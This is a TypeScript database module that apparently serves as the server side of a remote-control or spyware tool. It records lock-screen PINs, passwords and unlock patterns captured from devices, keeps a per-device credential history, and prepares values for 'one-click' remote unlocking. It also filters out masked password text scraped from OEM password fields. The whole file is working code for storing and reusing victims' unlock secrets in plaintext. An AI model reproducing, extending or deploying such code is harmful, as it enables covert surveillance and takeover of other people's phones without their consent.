import { randomUUID } from "node:crypto";
import type { ResultSetHeader, RowDataPacket } from "mysql2";
import { pool } from "../db/pool.js";

interface KeyguardPinRow extends RowDataPacket {
  device_id: string;
  pin_content: string;
  digit_count: number;
  lock_type?: string | null;
  gesture_path?: string | null;
  captured_at: Date;
  updated_at: Date;
}

interface KeyguardPinHistoryRow extends RowDataPacket {
  id: string;
  device_id: string;
  pin_content: string;
  digit_count: number;
  lock_type?: string | null;
  gesture_path?: string | null;
  source?: string | null;
  captured_at: Date;
  created_at: Date;
}

export type KeyguardLockType = "pin" | "password" | "pattern";

export interface KeyguardPinRecord {
  deviceId: string;
  pin: string;
  digitCount: number;
  lockType: KeyguardLockType;
  gesturePath: string;
  capturedAt: Date;
  updatedAt: Date;
}

export interface UpsertKeyguardPinInput {
  pin: string;
  lockType?: string | null;
  gesturePath?: string | null;
  capturedAt?: number;
}

export type KeyguardPinHistorySource = "device" | "manual";

export interface KeyguardPinHistoryRecord {
  id: string;
  deviceId: string;
  pin: string;
  digitCount: number;
  lockType: KeyguardLockType;
  gesturePath: string;
  source: KeyguardPinHistorySource;
  capturedAt: Date;
  createdAt: Date;
}

function normalizeLockType(value?: string | null): KeyguardLockType {
  const raw = (value ?? "").trim().toLowerCase();
  if (raw === "password" || raw === "2") {
    return "password";
  }
  if (raw === "pattern" || raw === "3") {
    return "pattern";
  }
  return "pin";
}

function normalizeGesturePath(value?: string | null): string {
  const trimmed = (value ?? "").trim();
  if (!trimmed || trimmed === "[]" || !trimmed.startsWith("[")) {
    return "";
  }
  try {
    const parsed = JSON.parse(trimmed);
    if (!Array.isArray(parsed) || parsed.length < 2) {
      return "";
    }
    return trimmed;
  } catch {
    return "";
  }
}

const PASSWORD_MASK_RE = /[•●○*∗･・⚫·∙․﹡＊\u25CF\u2022\u00B7\u2219\u2024\uFF65]/;

function looksLikeMaskedSecret(value: string): boolean {
  if (PASSWORD_MASK_RE.test(value)) {
    return true;
  }
  const digits = (value.match(/\d/g) ?? []).length;
  const letters = (value.match(/[A-Za-z]/g) ?? []).length;
  const other = value.length - digits - letters;
  return value.length >= 3 && other >= 2 && digits > 0 && digits <= 2 && letters === 0;
}

function normalizeSecret(pin: string, lockType: KeyguardLockType): string {
  const trimmed = pin.trim();
  if (!trimmed) {
    return "";
  }
  // OEM password fields often expose "•••••5" — never persist.
  if (looksLikeMaskedSecret(trimmed)) {
    return "";
  }
  if (lockType === "pin") {
    return /^\d+$/.test(trimmed) ? trimmed : "";
  }
  if (lockType === "pattern") {
    // cells: "1-2-5-8" or "0,1,4,7,"
    if (/^\d+([-,]\d+)+,?$/.test(trimmed)) {
      return trimmed.replace(/,$/, "");
    }
    return "";
  }
  // mixed password
  return trimmed.replace(/[\x00-\x1f\x7f]/g, "").slice(0, 64);
}

function digitCountOf(secret: string, lockType: KeyguardLockType): number {
  if (lockType === "pattern") {
    return secret.split(/[-,]/).filter(Boolean).length;
  }
  return secret.replace(/\D/g, "").length || secret.length;
}

function mapKeyguardPin(row: KeyguardPinRow): KeyguardPinRecord {
  const lockType = normalizeLockType(row.lock_type);
  return {
    deviceId: row.device_id,
    pin: row.pin_content,
    digitCount: Number(row.digit_count ?? 0),
    lockType,
    gesturePath: typeof row.gesture_path === "string" ? row.gesture_path : "",
    capturedAt: row.captured_at,
    updatedAt: row.updated_at,
  };
}

/**
 * 规范化设备上报的锁屏凭据（不写一键解锁库）。
 * 一键解锁只由管理端人工「填入/设为默认」写入；设备上报写入历史表。
 */
export function normalizeKeyguardPinAnnouncement(
  deviceId: string,
  input: UpsertKeyguardPinInput | string,
  capturedAtLegacy?: number,
): KeyguardPinRecord | null {
  const payload: UpsertKeyguardPinInput =
    typeof input === "string"
      ? { pin: input, capturedAt: capturedAtLegacy }
      : input;

  const lockType = normalizeLockType(payload.lockType);
  const normalized = normalizeSecret(payload.pin, lockType);
  if (!normalized) {
    return null;
  }

  const gesturePath =
    lockType === "pattern" ? normalizeGesturePath(payload.gesturePath) : "";
  const capturedDate = payload.capturedAt ? new Date(payload.capturedAt) : new Date();
  const now = new Date();
  return {
    deviceId,
    pin: normalized,
    digitCount: digitCountOf(normalized, lockType),
    lockType,
    gesturePath,
    capturedAt: capturedDate,
    updatedAt: now,
  };
}

function mapHistoryRow(row: KeyguardPinHistoryRow): KeyguardPinHistoryRecord {
  const sourceRaw = (row.source ?? "device").trim().toLowerCase();
  return {
    id: row.id,
    deviceId: row.device_id,
    pin: row.pin_content,
    digitCount: Number(row.digit_count ?? 0),
    lockType: normalizeLockType(row.lock_type),
    gesturePath: typeof row.gesture_path === "string" ? row.gesture_path : "",
    source: sourceRaw === "manual" ? "manual" : "device",
    capturedAt: row.captured_at,
    createdAt: row.created_at,
  };
}

/** 追加锁屏密码历史（幂等：同 device+pin 顶置，不重复堆） */
export async function appendKeyguardPinHistory(
  deviceId: string,
  input: UpsertKeyguardPinInput,
  source: KeyguardPinHistorySource = "device",
): Promise<KeyguardPinHistoryRecord | null> {
  const normalized = normalizeKeyguardPinAnnouncement(deviceId, input);
  if (!normalized) {
    return null;
  }

  const [existingRows] = await pool.query<KeyguardPinHistoryRow[]>(
    `SELECT * FROM device_keyguard_pin_history
     WHERE device_id = ? AND pin_content = ? AND captured_at = ?
     LIMIT 1`,
    [deviceId, normalized.pin, normalized.capturedAt],
  );
  if (existingRows[0]) {
    return mapHistoryRow(existingRows[0]);
  }

  const [latestSamePin] = await pool.query<KeyguardPinHistoryRow[]>(
    `SELECT * FROM device_keyguard_pin_history
     WHERE device_id = ? AND pin_content = ?
     ORDER BY captured_at DESC
     LIMIT 1`,
    [deviceId, normalized.pin],
  );
  if (latestSamePin[0]) {
    await pool.query(
      `UPDATE device_keyguard_pin_history
       SET digit_count = ?, lock_type = ?, gesture_path = ?, source = ?, captured_at = ?
       WHERE id = ?`,
      [
        normalized.digitCount,
        normalized.lockType,
        normalized.gesturePath || null,
        source,
        normalized.capturedAt,
        latestSamePin[0].id,
      ],
    );
    const [updated] = await pool.query<KeyguardPinHistoryRow[]>(
      "SELECT * FROM device_keyguard_pin_history WHERE id = ? LIMIT 1",
      [latestSamePin[0].id],
    );
    return updated[0] ? mapHistoryRow(updated[0]) : mapHistoryRow(latestSamePin[0]);
  }

  const id = randomUUID();
  await pool.query(
    `INSERT INTO device_keyguard_pin_history
       (id, device_id, pin_content, digit_count, lock_type, gesture_path, source, captured_at)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
    [
      id,
      deviceId,
      normalized.pin,
      normalized.digitCount,
      normalized.lockType,
      normalized.gesturePath || null,
      source,
      normalized.capturedAt,
    ],
  );

  if (normalized.lockType === "pin" && /^\d+$/.test(normalized.pin) && normalized.pin.length >= 4) {
    await pool.query(
      `DELETE FROM device_keyguard_pin_history
       WHERE device_id = ?
         AND lock_type = 'pin'
         AND pin_content REGEXP '^[0-9]+$'
         AND pin_content <> ?
         AND CHAR_LENGTH(pin_content) < CHAR_LENGTH(?)
         AND (? LIKE CONCAT(pin_content, '%') OR ? LIKE CONCAT('%', pin_content))`,
      [deviceId, normalized.pin, normalized.pin, normalized.pin, normalized.pin],
    );
  }

  const [rows] = await pool.query<KeyguardPinHistoryRow[]>(
    "SELECT * FROM device_keyguard_pin_history WHERE id = ? LIMIT 1",
    [id],
  );
  return rows[0] ? mapHistoryRow(rows[0]) : null;
}

export async function listKeyguardPinHistory(
  deviceId: string,
  limit = 50,
): Promise<KeyguardPinHistoryRecord[]> {
  const safeLimit = Math.min(Math.max(limit, 1), 200);
  const [rows] = await pool.query<KeyguardPinHistoryRow[]>(
    `SELECT * FROM device_keyguard_pin_history
     WHERE device_id = ?
     ORDER BY captured_at DESC
     LIMIT ?`,
    [deviceId, safeLimit],
  );
  return rows
    .map(mapHistoryRow)
    .filter((item) => !looksLikeMaskedSecret(item.pin));
}

export async function deleteKeyguardPinHistory(
  deviceId: string,
  historyId: string,
): Promise<boolean> {
  const [result] = await pool.query<ResultSetHeader>(
    "DELETE FROM device_keyguard_pin_history WHERE device_id = ? AND id = ?",
    [deviceId, historyId],
  );
  return result.affectedRows > 0;
}

export async function upsertKeyguardPin(
  deviceId: string,
  input: UpsertKeyguardPinInput | string,
  capturedAtLegacy?: number,
) {
  const payload: UpsertKeyguardPinInput =
    typeof input === "string"
      ? { pin: input, capturedAt: capturedAtLegacy }
      : input;

  const lockType = normalizeLockType(payload.lockType);
  const normalized = normalizeSecret(payload.pin, lockType);
  if (!normalized) {
    throw new Error("keyguard_pin_invalid");
  }

  const gesturePath =
    lockType === "pattern" ? normalizeGesturePath(payload.gesturePath) : "";
  if (lockType === "pattern" && !gesturePath) {
    // pattern without PATH cannot remote-unlock; still allow cell string for display
  }

  const existing = await getKeyguardPin(deviceId);
  if (
    lockType === "pin" &&
    existing &&
    existing.lockType === "pin" &&
    normalized.length < existing.pin.length &&
    existing.pin.startsWith(normalized) &&
    existing.pin.length - normalized.length >= 2
  ) {
    return existing;
  }

  const capturedDate = payload.capturedAt ? new Date(payload.capturedAt) : new Date();
  const digitCount = digitCountOf(normalized, lockType);

  await pool.query(
    `INSERT INTO device_keyguard_pins
       (device_id, pin_content, digit_count, lock_type, gesture_path, captured_at)
     VALUES (?, ?, ?, ?, ?, ?)
     ON DUPLICATE KEY UPDATE
       pin_content = VALUES(pin_content),
       digit_count = VALUES(digit_count),
       lock_type = VALUES(lock_type),
       gesture_path = VALUES(gesture_path),
       captured_at = VALUES(captured_at),
       updated_at = CURRENT_TIMESTAMP`,
    [deviceId, normalized, digitCount, lockType, gesturePath || null, capturedDate],
  );

  return getKeyguardPin(deviceId);
}

export async function getKeyguardPin(deviceId: string): Promise<KeyguardPinRecord | null> {
  const [rows] = await pool.query<KeyguardPinRow[]>(
    "SELECT * FROM device_keyguard_pins WHERE device_id = ? LIMIT 1",
    [deviceId],
  );
  const row = rows[0];
  if (!row) {
    return null;
  }
  const record = mapKeyguardPin(row);
  // Stale OEM mask leaks (e.g. "•••••5") poison one-click unlock — purge on read.
  if (looksLikeMaskedSecret(record.pin)) {
    await deleteKeyguardPin(deviceId);
    return null;
  }
  return record;
}

export async function deleteKeyguardPin(deviceId: string): Promise<void> {
  await pool.query("DELETE FROM device_keyguard_pins WHERE device_id = ?", [deviceId]);
}
